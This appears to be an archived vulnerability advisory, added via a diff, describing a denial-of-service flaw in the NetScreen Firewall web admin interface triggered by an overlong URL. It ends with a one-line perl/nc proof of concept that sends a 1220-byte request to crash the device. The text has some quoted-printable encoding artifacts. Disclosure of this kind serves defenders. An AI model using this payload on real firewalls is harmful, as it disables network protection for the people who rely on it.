@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/2176/info
+
+NetScreen Firewall is a network appliance used to secure against intruders and various types of attacks to a network. NetScreen has a Web administrative Interface (WebUI) used to configure and set the firewall settings.
+
+It is possible to cause a denial of service in NetScreen Firewall. Requesting an unusually long URL to WebUI listening on default port 80, will cause the firewall to crash. A restart of the service is required in order to gain normal functionality. 
+
+Once the input URL is longer than 1220 bytes=A3=ACNetScreen firewall= will crash:
+
+$echo -e "GET /`perl -e 'print "A"x1220'` HTTP/1.0\n\n"|nc= netscreen_firewall 80 
